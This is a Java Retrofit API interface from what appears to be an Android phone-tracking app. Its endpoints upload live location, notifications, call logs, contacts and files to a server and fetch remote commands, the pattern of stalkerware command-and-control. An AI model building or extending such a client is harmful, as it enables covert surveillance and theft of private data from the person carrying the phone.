package com.varbin.locationtracker.APIs;

import java.util.List;

import callDetails.deviceRegisterModel;
import callDetails.inActiveCommand;
import models.logModel;
import models.AttrModel;
import models.ContactModel;
import models.FileUpload;
import notifications.notificationModel;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.GET;
import retrofit2.http.POST;
import retrofit2.http.Url;

public interface MyInterface {
    // live notification
    @POST("createNotification")
    Call<notificationModel> sendNotification (@Body notificationModel nm);
    // live location
    @POST("createLocation")
    Call<ModelClass> createLocation (@Body ModelClass modelClass);
    // call log
    @POST("crateCallLogBulk")
    Call<logModel> sendCallLog (@Body logModel del);
    // user register
    @POST("createContactPerson")
    Call<deviceRegisterModel> registerDevice (@Body deviceRegisterModel dm);
    // contact list to server
    @POST("crateContactBulk")
    Call<ContactModel> createContact (@Body ContactModel contactModel);
    //command for active
    @GET
    Call<List<AttrModel>> getCommand(@Url String url);
    // disable active command
    @GET
    Call<inActiveCommand> inActiveCommand(@Url String url);
    // file upload command
    @FormUrlEncoded
    @POST
    Call<Void> uploadData (@Field("file") String encode , @Url String url);
    // path sender
    @POST("setCommandFile")
    Call<FileUpload> sendData2 ( @Body FileUpload fileUpload);
    @FormUrlEncoded
    @POST("setCommandFile")
    Call<FileUpload> sendData (@Field("postcommand") String postcommand , @Field("device_id") String id ,@Field("path") String extra ,@Field("file_date_time") String file_date_time );
}

